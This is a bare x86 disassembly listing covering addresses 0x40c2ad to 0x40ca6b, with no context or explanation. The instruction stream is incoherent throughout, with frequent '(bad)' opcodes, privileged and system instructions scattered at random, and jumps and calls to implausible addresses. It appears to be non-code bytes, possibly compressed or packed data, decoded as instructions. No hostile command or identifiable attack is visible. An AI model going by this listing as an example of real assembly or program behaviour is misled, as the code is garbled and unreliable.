  40c2ad:	inc    DWORD PTR [ebp-0x20aff0e0]
  40c2b3:	mov    eax,DWORD PTR [eax]
  40c2b5:	in     al,0x8b
  40c2b7:	inc    ecx
  40c2b8:	or     al,0x8b
  40c2ba:	rcl    BYTE PTR [eax-0x7c],0xc8
  40c2be:	add    eax,DWORD PTR [ebp+0x0]
  40c2c1:	push   ecx
  40c2c2:	inc    ebp
  40c2c3:	call   0x4fcc4d
  40c2c8:	leave  
  40c2c9:	push   ebp
  40c2ca:	add    BYTE PTR [ebx+0x459466],cl
  40c2d0:	mov    ecx,0x8b8a89
  40c2d5:	or     al,0x33
  40c2d7:	jo     0x40c292
  40c2d9:	(bad)  
  40c2da:	cmp    ecx,DWORD PTR [eax]
  40c2dc:	add    al,ch
  40c2de:	add    eax,DWORD PTR [edi]
  40c2e0:	mov    eax,DWORD PTR [eax]
  40c2e2:	or     BYTE PTR [ebp+0x39],cl
  40c2e5:	mov    ecx,DWORD PTR [edi]
  40c2e7:	cmp    al,0xa9
  40c2e9:	rol    DWORD PTR [eax],0xb7
  40c2ec:	mov    edx,DWORD PTR [esp+edi*8]
  40c2ef:	dec    esp
  40c2f0:	dec    ebp
  40c2f1:	sbb    BYTE PTR [ebx+0x418b084d],cl
  40c2f7:	cld    
  40c2f8:	mov    DWORD PTR [edi-0x31bff9f4],esi
  40c2fe:	test   ebx,ecx
  40c300:	cmovne ecx,DWORD PTR [edi-0x38f0ffc5]
  40c307:	test   al,0xd4
  40c309:	add    BYTE PTR [ebp+0x45fcf88b],al
  40c30f:	into   
  40c310:	xor    ecx,ebx
  40c312:	add    ecx,DWORD PTR [ebp-0x77]
  40c315:	mov    edx,esp
  40c317:	fadd   QWORD PTR [ebp-0x49]
  40c31a:	mov    eax,DWORD PTR [esi]
  40c31c:	nop
  40c31d:	into   
  40c31e:	add    cl,dl
  40c320:	mov    edx,ebx
  40c322:	mov    edx,DWORD PTR [ebp+0x3c]
  40c325:	invd   
  40c327:	mov    BYTE PTR [ebp+0x0],al
  40c32a:	mov    ecx,DWORD PTR [ebx-0x3dffe774]
  40c330:	mov    ecx,DWORD PTR [ecx+0x3e41889]
  40c336:	push   ebp
  40c337:	push   ebp
  40c338:	cmp    ecx,DWORD PTR [ebx+0x488b3875]
  40c33e:	fmul   DWORD PTR [ecx+0x28dd000]
  40c344:	call   0xf8484f0a
  40c349:	rcl    esi,1
  40c34b:	rcl    ebx,0x45
  40c34e:	call   DWORD PTR [eax+0x50]
  40c351:	inc    edx
  40c352:	jne    0x40c357
  40c354:	jmp    DWORD PTR [eax]
  40c356:	sbb    al,0xe8
  40c358:	dec    ebp
  40c359:	or     BYTE PTR [ebx+0x49555400],cl
  40c35f:	mov    ebp,DWORD PTR [ebx]
  40c361:	sbb    BYTE PTR [ebx],al
  40c363:	dec    eax
  40c364:	and    BYTE PTR [ebx],dh
  40c366:	push   eax
  40c367:	add    edi,DWORD PTR [ebx]
  40c369:	cmp    eax,DWORD PTR [eax]
  40c36b:	je     0x40c2f8
  40c36d:	push   ecx
  40c36e:	and    BYTE PTR [ebp-0x79],cl
  40c371:	add    eax,DWORD PTR [ecx]
  40c373:	or     al,0x0
  40c375:	inc    eax
  40c376:	adc    BYTE PTR [ebx],al
  40c378:	inc    ebp
  40c379:	and    bh,bh
  40c37b:	push   eax
  40c37c:	push   esp
  40c37d:	sub    DWORD PTR [ebp+0x0],esi
  40c380:	push   edx
  40c381:	mov    ecx,eax
  40c383:	sbb    BYTE PTR [eax],al
  40c385:	dec    ebp
  40c386:	mov    ecx,DWORD PTR [ebx-0x3fbe1fe0]
  40c38c:	add    esi,DWORD PTR [ebx]
  40c38e:	jge    0x72cdcddc
  40c394:	add    DWORD PTR [eax],eax
  40c396:	mov    DWORD PTR [ebp+0x18],edx
  40c399:	mov    DWORD PTR [ebp+0x18],ecx
  40c39c:	cmovne edx,DWORD PTR [eax+0xf]
  40c3a0:	xor    edx,DWORD PTR [edx+0x3]
  40c3a3:	xor    ecx,DWORD PTR [ecx-0x2e74f3d5]
  40c3a9:	or     al,0x84
  40c3ab:	rol    DWORD PTR [eax],cl
  40c3ad:	dec    ebp
  40c3ae:	add    BYTE PTR [ebx],bh
  40c3b0:	dec    ebp
  40c3b1:	jbe    0x40c3e6
  40c3b3:	mov    eax,DWORD PTR [ebx]
  40c3b5:	cld    
  40c3b6:	mov    DWORD PTR [edi+0x4d01e0],edx
  40c3bc:	bswap  esi
  40c3be:	push   eax
  40c3bf:	retf   
  40c3c0:	xor    ecx,DWORD PTR [ebp+0x2b]
  40c3c3:	mov    ebp,DWORD PTR [ebx]
  40c3c5:	and    BYTE PTR [ecx],bh
  40c3c7:	or     ah,al
  40c3c9:	daa    
  40c3ca:	xchg   DWORD PTR [edi+0x100],eax
  40c3d0:	push   ebp
  40c3d1:	push   ebp
  40c3d2:	adc    DWORD PTR [edx+0x8],0x55
  40c3d6:	push   ebp
  40c3d7:	xor    ebp,ebx
  40c3d9:	add    ecx,DWORD PTR [ebx+0x40551852]
  40c3df:	dec    DWORD PTR [ebp+0x45ffff54]
  40c3e5:	sbb    al,0x8b
  40c3e7:	rol    BYTE PTR [ebp-0x8fe8b7c],0x0
  40c3ee:	and    eax,DWORD PTR [ebp+0x3]
  40c3f1:	mov    edx,eax
  40c3f3:	enter  0x8b,0x4
  40c3f7:	mov    eax,DWORD PTR [ebp+0x33]
  40c3fa:	push   eax
  40c3fb:	add    esp,DWORD PTR [edi-0x74f5fff1]
  40c401:	add    ah,bh
  40c403:	add    DWORD PTR [ebp-0x28],0xffffff8b
  40c407:	mov    eax,0xd64f08
  40c40c:	ror    DWORD PTR [ecx-0x3fe83b36],cl
  40c412:	mov    esp,DWORD PTR [esi+0x8]
  40c415:	inc    ebp
  40c416:	dec    eax
  40c417:	mov    eax,0x44f8b
  40c41c:	inc    ebp
  40c41d:	mov    DWORD PTR [ecx-0x38],edx
  40c420:	call   0xc3cbe5
  40c425:	or     BYTE PTR [ebp-0x75],al
  40c428:	mov    esp,DWORD PTR [esi-0x24]
  40c42b:	inc    ebp
  40c42c:	push   ebp
  40c42d:	mov    eax,0x284e83
  40c432:	into   
  40c433:	mov    DWORD PTR [edx+ecx*8-0x31cd7662],ecx
  40c43a:	mov    eax,DWORD PTR [ebp+0xc]
  40c43d:	lea    eax,[ebp+0x45]
  40c440:	mov    edi,DWORD PTR [ecx+0xb78adc]
  40c446:	push   es
  40c447:	xor    eax,esi
  40c449:	mov    edx,0x453bd0
  40c44e:	sub    eax,DWORD PTR [ebx]
  40c450:	mov    edi,edi
  40c452:	loopne 0x40c45c
  40c454:	retf   0x837d
  40c457:	push   es
  40c458:	dec    ebp
  40c459:	mov    DWORD PTR [ebx+0xc78c72],ecx
  40c45f:	lods   al,BYTE PTR ds:[esi]
  40c460:	xor    edx,eax
  40c462:	add    esi,DWORD PTR [edx]
  40c464:	mov    DWORD PTR [ebp+0x18],eax
  40c467:	xlat   BYTE PTR ds:[ebx]
  40c468:	dec    ebp
  40c469:	sar    BYTE PTR [ebx],1
  40c46b:	(bad)  
  40c46c:	jne    0x40c422
  40c46e:	mov    esp,eax
  40c470:	fsub   st,st(7)
  40c472:	add    BYTE PTR [ebp-0x73],al
  40c475:	xor    ch,al
  40c477:	out    dx,al
  40c478:	mov    eax,edi
  40c47a:	hlt    
  40c47b:	mov    esp,0xd3d3d0d6
  40c480:	mov    eax,edi
  40c482:	in     al,0xc0
  40c484:	jb     0x40c467
  40c486:	push   ecx
  40c487:	inc    ebp
  40c488:	push   eax
  40c489:	jl     0x40c410
  40c48b:	leave  
  40c48c:	cmove  esi,esp
  40c48f:	lods   al,BYTE PTR ds:[esi]
  40c490:	add    BYTE PTR [eax],dl
  40c492:	mov    esi,edx
  40c494:	or     al,0x80
  40c496:	(bad)  
  40c497:	xor    eax,0x83008801
  40c49c:	or     DWORD PTR [edi],edx
  40c49e:	into   
  40c49f:	in     al,dx
  40c4a0:	retf   
  40c4a1:	xchg   DWORD PTR [ecx+eax*1+0x4d000001],eax
  40c4a8:	gs push ecx
  40c4aa:	add    BYTE PTR [eax+0x24],dl
  40c4ad:	mov    eax,DWORD PTR [eax]
  40c4af:	fsub   DWORD PTR [esi+0x0]
  40c4b2:	inc    ebp
  40c4b3:	lea    eax,[ebx-0x76aff554]
  40c4b9:	push   ecx
  40c4ba:	(bad)  
  40c4bb:	lea    ebx,[esi]
  40c4bd:	fadd   DWORD PTR [eax]
  40c4bf:	mov    esp,DWORD PTR [esi-0x74]
  40c4c2:	inc    ebp
  40c4c3:	add    BYTE PTR [ebx+0x65ff08ff],al
  40c4c9:	mov    eax,DWORD PTR [eax]
  40c4cb:	fmul   st,st(0)
  40c4cd:	ror    BYTE PTR [ecx-0x45ba33c6],0xeb
  40c4d4:	add    BYTE PTR [ebx-0x27b2769a],cl
  40c4da:	inc    bp
  40c4dc:	inc    ebp
  40c4dd:	je     0x40c46a
  40c4df:	mov    ecx,DWORD PTR [eax]
  40c4e1:	sbb    BYTE PTR [edi+ecx*4-0x3c],al
  40c4e5:	add    DWORD PTR [edx+0x0],eax
  40c4e8:	add    BYTE PTR [ecx],dl
  40c4ea:	jmpw   0x14f6
  40c4ee:	or     BYTE PTR [ebx+0x668c00],cl
  40c4f4:	retf   0x453b
  40c4f7:	jne    0x40c47c
  40c4f9:	mov    ecx,DWORD PTR [eax]
  40c4fb:	in     al,0x66
  40c4fd:	(bad)
  40c501:	add    BYTE PTR [ebp+0x52],al
  40c504:	enter  0xee03,0x89
  40c508:	(bad)  
  40c509:	sbb    al,0xb0
  40c50b:	inc    ebp
  40c50c:	jmp    0xea20:0x45ff3357
  40c513:	and    dh,ch
  40c515:	inc    edi
  40c517:	test   DWORD PTR [eax+0x3fc3ed0f],edi
  40c51d:	add    BYTE PTR [ebp-0x1],al
  40c520:	ror    BYTE PTR [esi+ebp*8],1
  40c523:	(bad)  
  40c524:	data16 jne 0x40c56c
  40c527:	call   0x7bd0d
  40c52c:	ret    0x33c0
  40c52f:	test   BYTE PTR [ebp-0x75fff300],cl
  40c535:	inc    ebp
  40c536:	or     BYTE PTR [ebx-0x3015dfb7],0x41
  40c53d:	sub    BYTE PTR [eax],dl
  40c53f:	(bad)  
  40c540:	stc    
  40c541:	test   DWORD PTR [edx+0xf],esi
  40c544:	mov    ebx,DWORD PTR [ecx+0x570000d8]
  40c54a:	lea    esi,[ebp-0x3c]
  40c54d:	call   0xff45c051
  40c552:	pop    eax
  40c554:	add    DWORD PTR [eax+eax*1+0x52005500],eax
  40c55b:	xchg   edi,edi
  40c55d:	add    DWORD PTR [eax],ecx
  40c55f:	add    BYTE PTR [ebp+0x55],cl
  40c562:	push   ecx
  40c563:	cmp    ecx,DWORD PTR [edi+0x8b0175]
  40c569:	fdiv   DWORD PTR [ecx]
  40c56b:	add    al,dl
  40c56d:	lea    eax,[ebp-0x18]
  40c570:	test   edi,edi
  40c572:	je     0x40c55c
  40c574:	mov    DWORD PTR [ebp+0x8],ecx
  40c577:	dec    DWORD PTR [edx]
  40c579:	push   esp
  40c57a:	add    bh,bh
  40c57c:	inc    ebp
  40c57d:	sbb    al,0x3b
  40c57f:	push   ebp
  40c580:	or     BYTE PTR [ebx+0x50c80d],cl
  40c586:	mov    ecx,DWORD PTR [ebx+0x300338c]
  40c58c:	cmp    esi,DWORD PTR [ebp+esi*2-0x75]
  40c590:	mov    ecx,DWORD PTR [eax+ebx*1]
  40c593:	inc    ecx
  40c594:	pop    edi
  40c596:	add    DWORD PTR [eax],ecx
  40c598:	add    BYTE PTR [ebp+0x7511f811],ah
  40c59e:	push   ebp
  40c59f:	dec    DWORD PTR [ebx+0xf69014]
  40c5a5:	or     BYTE PTR [ebx+0x11752800],cl
  40c5ab:	adc    DWORD PTR [eax-0x62],0x660c008b
  40c5b2:	push   eax
  40c5b3:	jno    0x40c62a
  40c5b5:	add    ebp,eax
  40c5b7:	push   edx
  40c5b8:	clc    
  40c5b9:	sar    bh,1
  40c5bb:	xchg   eax,eax
  40c5bd:	add    DWORD PTR [eax+eax*1-0x7ff7b00],eax
  40c5c4:	jne    0x40c5d0
  40c5c6:	mov    eax,DWORD PTR [ebp-0x1]
  40c5c9:	mov    esp,DWORD PTR [eax]
  40c5cb:	sub    BYTE PTR [edx+eax*8-0x1],ah
  40c5cf:	rol    BYTE PTR [ebp-0x5174f0bb],1
  40c5d5:	loopne 0x40c5d7
  40c5d7:	dec    ebp
  40c5d8:	mov    ecx,DWORD PTR [ecx+0x1855c70c]
  40c5de:	mov    eax,DWORD PTR [eax]
  40c5e0:	call   0xffbebbe5
  40c5e5:	add    al,al
  40c5e7:	add    al,0x84
  40c5e9:	add    BYTE PTR gs:[eax],al
  40c5ec:	add    BYTE PTR [ebp-0x1],al
  40c5ef:	jmp    0x40c611
  40c5f1:	xor    ecx,eax
  40c5f3:	pop    edi
  40c5f4:	call   FWORD PTR [ebx-0x7b]
  40c5f7:	ret    0xf
  40c5fa:	mov    BYTE PTR [ebx+0x518b0f00],cl
  40c600:	mov    WORD PTR [edi],cs
  40c602:	add    BYTE PTR [ecx-0x75],al
  40c605:	push   ebx
  40c606:	and    BYTE PTR [ebx],dh
  40c608:	adc    BYTE PTR [ebp-0x7a78f7e6],cl
  40c60e:	add    DWORD PTR [eax+eax*1-0x75],esi
  40c612:	dec    ebp
  40c613:	or     al,0x51
  40c615:	sbb    al,0x75
  40c617:	cmp    DWORD PTR [ebx+0x710ce408],ecx
  40c61d:	pop    eax
  40c61e:	push   edx
  40c61f:	add    edx,DWORD PTR [eax+0x3]
  40c622:	mov    edi,DWORD PTR [ecx]
  40c624:	and    BYTE PTR [eax],cl
  40c626:	xchg   DWORD PTR [edx],ecx
  40c628:	add    eax,eax
  40c62a:	add    BYTE PTR [edi+0x0],al
  40c62d:	cli    
  40c62e:	(bad)  
  40c62f:	loope  0x40c5f4
  40c631:	shl    BYTE PTR [edi],0x5b
  40c634:	dec    ebp
  40c635:	ret    0x8b
  40c638:	sub    BYTE PTR [ebx+0x28358345],cl
  40c63e:	pushf  
  40c63f:	inc    ebp
  40c640:	mov    esi,DWORD PTR ds:0xc7759c08
  40c646:	and    esp,0xf8008557
  40c64c:	inc    DWORD PTR [ebp+0x10]
  40c64f:	xor    eax,esi
  40c651:	pushf  
  40c652:	jb     0x40c60c
  40c654:	add    BYTE PTR [edi+0x9],cl
  40c657:	add    BYTE PTR [esi],dl
  40c659:	mov    edx,eax
  40c65b:	hlt    
  40c65c:	inc    eax
  40c65e:	(bad)  
  40c65f:	data16 rol BYTE PTR [ebp+0x0],1
  40c663:	mov    eax,0x9c4f34
  40c668:	jmp    0x40c5f3
  40c66a:	mov    edi,eax
  40c66c:	or     al,0xc0
  40c66e:	inc    eax
  40c66f:	add    ax,WORD PTR [ebp-0x1]
  40c673:	mov    ecx,DWORD PTR [ecx+0x4545e008]
  40c679:	mov    ecx,DWORD PTR [ebx+0x1451c0c]
  40c67f:	mov    eax,DWORD PTR [ebp-0x10]
  40c682:	add    DWORD PTR [ecx+0x7830800],edi
  40c688:	sbb    cl,al
  40c68a:	jne    0x40c617
  40c68c:	sub    esp,0x20
  40c68f:	sahf   
  40c690:	mov    esi,DWORD PTR [edx]
  40c692:	and    BYTE PTR [ebx],al
  40c694:	add    dl,BYTE PTR [edi-0x40]
  40c697:	lock pop esi
  40c699:	test   cl,cl
  40c69b:	add    DWORD PTR [eax+eax*1],ebx
  40c69e:	push   ebp
  40c69f:	inc    ebp
  40c6a0:	in     al,dx
  40c6a1:	mov    esi,DWORD PTR [edi-0x483ef918]
  40c6a7:	ret    0xf014
  40c6aa:	push   edi
  40c6ab:	test   bh,bh
  40c6ad:	add    DWORD PTR [eax+eax*1+0x18],eax
  40c6b1:	inc    ebp
  40c6b2:	shl    BYTE PTR [ebx],cl
  40c6b4:	pop    ds
  40c6b5:	add    ecx,DWORD PTR [eax-0x77]
  40c6b8:	(bad)  
  40c6b9:	loopne 0x40c6ec
  40c6bb:	inc    ebp
  40c6bc:	pop    ebp
  40c6bd:	xor    esi,DWORD PTR [edx+0x3]
  40c6c0:	mov    ecx,DWORD PTR [ecx-0x482623f8]
  40c6c6:	fdivp  st(4),st
  40c6c8:	pop    ebp
  40c6c9:	mov    bh,0x72
  40c6cb:	hlt    
  40c6cc:	add    DWORD PTR [edx+0x28],0x0
  40c6d0:	cmp    esp,DWORD PTR [esi+0x72]
  40c6d3:	lock xor eax,DWORD PTR [edx+0x5f]
  40c6d7:	add    BYTE PTR [ebp+0x66],bl
  40c6da:	add    al,0xfb
  40c6dc:	push   ebp
  40c6dd:	or     ah,ch
  40c6df:	add    ah,ch
  40c6e1:	data16 (bad) 
  40c6e3:	lock lock add eax,DWORD PTR [ebp+0x4566f82b]
  40c6eb:	jge    0x40c721
  40c6ed:	mov    ebx,DWORD PTR [eax+eiz*8+0x66d87dc7]
  40c6f4:	test   DWORD PTR [eax+edi*8],esi
  40c6f7:	sbb    si,WORD PTR [ebp+0x0]
  40c6fb:	mov    esp,DWORD PTR [esi-0x24]
  40c6fe:	inc    ebp
  40c6ff:	jge    0x40c684
  40c701:	pushaw 
  40c703:	xor    al,0x89
  40c705:	data16 cld 
  40c707:	jne    0x40c739
  40c709:	mov    esi,0x667200
  40c70e:	inc    ebp
  40c70f:	or     BYTE PTR [ebx-0x76742000],al
  40c715:	lock clc 
  40c717:	mov    eax,DWORD PTR [ebp+0xc]
  40c71a:	mov    edi,esi
  40c71c:	in     al,dx
  40c71d:	or     BYTE PTR [ebp+0x0],al
  40c720:	mov    esi,edi
  40c722:	call   0x53500c62
  40c727:	sbb    dl,BYTE PTR [edi+0x0]
  40c72a:	push   ecx
  40c72b:	mov    esi,DWORD PTR [ebx]
  40c72d:	lock push esi
  40c72f:	pop    ebp
  40c730:	jne    0x40c765
  40c732:	mov    edx,0x3b7203
  40c737:	retw   0x3b7d
  40c73b:	minpd  xmm7,xmm0
  40c73f:	str    WORD PTR [ebp+0x66f0008b]
  40c746:	jne    0x40c727
  40c748:	xor    eax,DWORD PTR [ebx+eax*1+0xf003b00]
  40c74f:	mov    esp,esi
  40c751:	cld    
  40c752:	add    BYTE PTR [edx-0x75],al
  40c755:	add    al,dh
  40c757:	sar    bx,0xc2
  40c75b:	mov    eax,DWORD PTR [ebp+0x8]
  40c75e:	mov    eax,DWORD PTR [ebx]
  40c760:	lock rcr di,0xc2
  40c765:	es inc ebp
  40c767:	mov    ecx,DWORD PTR [edi]
  40c769:	clc    
  40c76a:	jne    0x40c7ae
  40c76c:	(bad)  
  40c76e:	jge    0x40c7d6
  40c770:	mov    eax,0x8b8afb
  40c775:	or     BYTE PTR [ebx],dh
  40c777:	add    edi,DWORD PTR [ebx+0xdf8a66]
  40c77d:	push   cs
  40c77e:	xor    esi,DWORD PTR [edi-0x48c4f748]
  40c784:	add    ah,dh
  40c786:	add    edi,ebx
  40c788:	mov    ax,di
  40c78b:	or     dh,bh
  40c78d:	mov    ecx,DWORD PTR [ecx+0x7542f4fc]
  40c793:	add    BYTE PTR [ebx-0x7404139a],cl
  40c799:	mov    esi,DWORD PTR [edi+0xc]
  40c79c:	mov    DWORD PTR [ebx],eax
  40c79e:	or     BYTE PTR [esi+0x75],ah
  40c7a1:	fisttp WORD PTR [ebx-0x747417da]
  40c7a7:	clc    
  40c7a8:	ja     0x40c7ec
  40c7aa:	mov    DWORD PTR [eax],eax
  40c7ac:	or     al,0x66
  40c7ae:	sahf   
  40c7af:	sti    
  40c7b0:	add    BYTE PTR [ebx+0x3010ce9],cl
  40c7b6:	add    BYTE PTR [esi+0x7d],ah
  40c7b9:	fbld   TBYTE PTR [esi+0xe]
  40c7bc:	pop    ebp
  40c7bd:	mov    bh,0x81
  40c7bf:	or     al,0x57
  40c7c1:	mov    bh,0x0
  40c7c3:	hlt    
  40c7c4:	add    edi,ebx
  40c7c6:	mov    di,bx
  40c7c9:	or     al,0x84
  40c7cb:	mov    eax,DWORD PTR [ecx]
  40c7cd:	or     al,0x0
  40c7cf:	mov    edi,DWORD PTR [ebp+0x8]
  40c7d2:	mov    edi,DWORD PTR [ebx]
  40c7d4:	adc    BYTE PTR [edi],cl
  40c7d6:	stc    
  40c7d7:	mov    ebx,0x8bdf00fa
  40c7dc:	mov    ebx,eax
  40c7de:	or     al,0x5d
  40c7e0:	mov    esi,DWORD PTR [ebx]
  40c7e2:	or     BYTE PTR [ebp+0x72001f84],cl
  40c7e8:	add    BYTE PTR [eax],al
  40c7ea:	cmp    edi,DWORD PTR [ebp+0xf]
  40c7ed:	mov    ecx,DWORD PTR [ebp+0x665d00d8]
  40c7f3:	xor    edi,DWORD PTR [ebp-0x73]
  40c7f6:	mov    ebx,0x728a1f
  40c7fb:	add    BYTE PTR [ebx],dh
  40c7fd:	jge    0x40c865
  40c7ff:	mov    ebx,DWORD PTR [ebp-0x20]
  40c802:	pop    bp
  40c804:	clc    
  40c805:	cmp    di,WORD PTR [edx+esi*2]
  40c809:	data16 data16 jge 0x40c88a
  40c80d:	mov    edi,DWORD PTR [ebx+0x5d8adc]
  40c813:	xor    di,WORD PTR [esi+eiz*2]
  40c817:	pop    bp
  40c819:	jge    0x40c881
  40c81b:	mov    edi,eax
  40c81d:	lock cmp ecx,DWORD PTR [ebx-0x8f0f789]
  40c824:	jge    0x40c82e
  40c826:	ltr    WORD PTR [ebp-0x2]
  40c82a:	add    edi,DWORD PTR [ebx]
  40c82c:	hsubpd xmm4,xmm0
  40c830:	data16 (bad) 
  40c832:	jge    0x40c7bf
  40c834:	mov    ebx,0xf18ae4
  40c839:	dec    ebp
  40c83a:	xor    eax,DWORD PTR [ebx]
  40c83c:	minpd  xmm6,xmm1
  40c840:	data16 jne 0x40c83b
  40c843:	jmp    0x40c880
  40c845:	mov    esi,DWORD PTR [edx-0x10]
  40c848:	sar    WORD PTR [ebp+0x4d],1
  40c84c:	mov    ebx,0xa8a8d
  40c851:	jb     0x40c886
  40c853:	add    BYTE PTR [esi+0x4d],ah
  40c856:	pop    ebp
  40c857:	mov    esp,DWORD PTR [esi-0x20]
  40c85a:	clc    
  40c85b:	jne    0x40c898
  40c85d:	data16 ja 0x40c894
  40c860:	jnp    0xf1502ee3
  40c866:	pop    ebp
  40c867:	inc    edx
  40c868:	add    eax,DWORD PTR [eax]
  40c86a:	data16 data16 jge 0x40c860
  40c86e:	mov    dx,0x7d
  40c872:	data16 pop bp
  40c875:	icebp  
  40c876:	sbb    di,bx
  40c879:	jne    0x40c800
  40c87b:	mov    eax,DWORD PTR [eax]
  40c87d:	call   0x77be5382
  40c882:	mov    ebp,DWORD PTR [ebx]
  40c884:	in     al,dx
  40c885:	data16 stc 
  40c887:	repnz mov esp,0x32759e3b
  40c88d:	xor    ecx,DWORD PTR [ecx+0x7d33eceb]
  40c893:	inc    eax
  40c894:	mov    eax,DWORD PTR [edi]
  40c896:	call   0xbc74c1e0
  40c89b:	add    ebx,DWORD PTR [esi-0x76a4cda1]
  40c8a1:	ret    0xe8
  40c8a4:	jge    0x40c831
  40c8a6:	mov    edx,DWORD PTR [ecx-0x14]
  40c8a9:	mov    ecx,DWORD PTR [ebx-0x76f784aa]
  40c8af:	add    BYTE PTR [eax],cl
  40c8b1:	data16 jge 0x40c882
  40c8b4:	mov    eax,DWORD PTR [edx-0x18]
  40c8b7:	add    BYTE PTR [ebx-0x7631849a],cl
  40c8bd:	mov    edx,0xc77d000c
  40c8c2:	data16 cld 
  40c8c4:	pop    ebp
  40c8c5:	test   DWORD PTR [ecx+0x3557f8],eax
  40c8cb:	pushf  
  40c8cc:	add    esp,DWORD PTR [esi+0x66]
  40c8cf:	into   
  40c8d0:	fistp  WORD PTR [ebp-0x7b]
  40c8d3:	push   edi
  40c8d4:	(bad)  
  40c8d5:	mov    bh,0xff
  40c8d7:	mov    edi,0xff338d75
  40c8dc:	mov    edx,DWORD PTR [edi-0x10]
  40c8df:	push   ecx
  40c8e0:	repnz mov ebx,0x894faf
  40c8e6:	lock cmp edx,DWORD PTR [edx]
  40c8e9:	jne    0x40c940
  40c8eb:	mov    DWORD PTR [ebx],esi
  40c8ed:	cld    
  40c8ee:	mov    edx,DWORD PTR [edi-0x1c]
  40c8f1:	xor    ecx,DWORD PTR [ebx+ecx*4+0x6632339e]
  40c8f8:	mov    DWORD PTR [esp+eiz*8-0x749baac4],ecx
  40c8ff:	mov    ebx,0x8b3bec
  40c904:	push   esi
  40c905:	sub    ecx,eax
  40c907:	mov    ebx,0xba8a2b
  40c90c:	mov    dh,BYTE PTR [ebx]
  40c90e:	add    BYTE PTR [ebx+0xb94e33],bh
  40c914:	dec    esi
  40c915:	cmp    eax,DWORD PTR [eax]
  40c917:	jne    0x40c954
  40c919:	mov    esi,DWORD PTR [ebp-0x4]
  40c91c:	mov    ebx,DWORD PTR [ebx-0x24]
  40c91f:	stc    
  40c920:	jge    0x40c8a7
  40c922:	data16 clc 
  40c924:	xor    al,0x9
  40c926:	data16 into 
  40c928:	lock test BYTE PTR [ebx],dh
  40c92b:	ds data16 fs icebp 
  40c92f:	pop    esi
  40c930:	add    al,0xc3
  40c932:	ror    BYTE PTR [ebx+0x57c0510c],0xeb
  40c939:	inc    ebp
  40c93a:	mov    esi,DWORD PTR [esi]
  40c93c:	in     al,0x9c
  40c93e:	sar    DWORD PTR [esi-0x7a17a3e],0xc9
  40c945:	pop    ebx
  40c946:	or     al,0xff
  40c948:	push   ebp
  40c949:	mov    ebp,esp
  40c94b:	mov    ah,BYTE PTR [esi+0x4]
  40c94e:	or     BYTE PTR [esi+edi*4],dh
  40c951:	cmp    al,0x3b
  40c953:	je     0x40c955
  40c955:	mov    ebp,DWORD PTR [ebx]
  40c957:	mov    edx,0xff8a8dbe
  40c95c:	add    BYTE PTR [edi+0x33],dl
  40c95f:	push   ecx
  40c960:	mov    esi,0x8b4e53
  40c965:	mov    ebx,0x363b45
  40c96a:	pushf  
  40c96b:	sub    edi,DWORD PTR [edx-0x7757a45]
  40c971:	add    BYTE PTR [ebx],bh
  40c973:	xor    esi,DWORD PTR [ebx+edi*4+0x53]
  40c977:	dec    edi
  40c978:	str    ecx
  40c97b:	cmp    esp,DWORD PTR [edx+0x75]
  40c97e:	int    0x89
  40c980:	mov    esi,0x77208fc
  40c985:	xor    edx,DWORD PTR [esi]
  40c987:	mov    eax,DWORD PTR [eax]
  40c989:	xor    esp,DWORD PTR [esi-0x73]
  40c98c:	retf   
  40c98d:	push   edi
  40c98e:	add    esp,ebp
  40c990:	push   ebp
  40c991:	add    BYTE PTR [ebp-0x293cfee8],cl
  40c997:	cmp    dl,0x49
  40c99a:	(bad)  
  40c99b:	sti    
  40c99c:	mov    esi,DWORD PTR [ebp+0x78]
  40c99f:	mov    esp,ebp
  40c9a1:	cld    
  40c9a2:	add    BYTE PTR ds:0xf8008508,bh
  40c9a8:	data16 or al,0xcb
  40c9ab:	rol    DWORD PTR [edx-0x37],0x0
  40c9af:	mov    DWORD PTR [esi+0x47],esp
  40c9b2:	retf   
  40c9b3:	in     eax,0xba
  40c9b5:	add    BYTE PTR [eax],al
  40c9b7:	(bad)  
  40c9b8:	pop    si
  40c9ba:	retf   
  40c9bb:	ret    
  40c9bc:	enter  0x4d8b,0x51
  40c9c0:	pop    edi
  40c9c1:	mov    DWORD PTR [ecx-0x637ac904],0x333574f8
  40c9cb:	pushf  
  40c9cc:	(bad)  
  40c9cd:	call   0x26c81a
  40c9d2:	add    BYTE PTR [ebx+0x3b55bac9],cl
  40c9d8:	in     al,dx
  40c9d9:	add    BYTE PTR [esi+0x2b],dl
  40c9dc:	(bad)  
  40c9dd:	mov    edx,0x858afc
  40c9e2:	clc    
  40c9e3:	xor    esi,DWORD PTR ds:0xe84e9cba
  40c9e9:	add    bh,bh
  40c9eb:	cmp    edi,edi
  40c9ed:	je     0x40c9e7
  40c9ef:	push   ebx
  40c9f0:	pop    es
  40c9f1:	sysexit 
  40c9f3:	leave  
  40c9f4:	dec    ecx
  40c9f5:	bound  edi,QWORD PTR [ebp+ecx*8+0x61]
  40c9f9:	mov    edi,0x76208c7
  40c9fe:	int    0x64
  40ca00:	mov    ecx,0x7660800
  40ca05:	retf   
  40ca06:	add    ax,WORD PTR [eax]
  40ca09:	jne    0x40ca13
  40ca0b:	lea    eax,[eax]
  40ca0d:	add    DWORD PTR [esi-0x9],esp
  40ca10:	ret    
  40ca11:	(bad)  
  40ca12:	inc    edx
  40ca13:	xlat   BYTE PTR ds:[ebx]
  40ca14:	add    BYTE PTR [ebx-0x1a3caf9a],cl
  40ca1a:	add    BYTE PTR fs:[eax],al
  40ca1d:	or     BYTE PTR [esi+0x0],ah
  40ca20:	ret    
  40ca21:	add    cx,bx
  40ca24:	jne    0x40ca68
  40ca26:	lea    eax,[eax]
  40ca28:	add    DWORD PTR [esi-0xf],esp
  40ca2b:	retf   
  40ca2c:	(bad)  
  40ca2d:	mov    edx,0x668400d1
  40ca32:	cmp    al,0xcb
  40ca34:	fs enter 0x7d8a,0x80
  40ca39:	ss xor eax,0x805ff39c
  40ca3f:	je     0x40cabd
  40ca41:	xor    eax,ebx
  40ca43:	inc    eax
  40ca44:	inc    ebp
  40ca45:	add    bl,BYTE PTR [ebx-0x40]
  40ca48:	ss leave 
  40ca4a:	pushf  
  40ca4b:	push   ebp
  40ca4c:	je     0x40ca3a
  40ca4e:	xor    ecx,DWORD PTR [ebx-0x4899f7cd]
  40ca54:	mov    WORD PTR [esi+0x3c],ss
  40ca57:	and    DWORD PTR [esp+eax*8-0x75],0xc9425fff
  40ca5f:	add    BYTE PTR [ebp+0x57],dl
  40ca62:	in     al,dx
  40ca63:	(bad)  
  40ca64:	push   esi
  40ca65:	mov    edx,0x89360045
  40ca6a:	pushf  
  40ca6b:	cld    
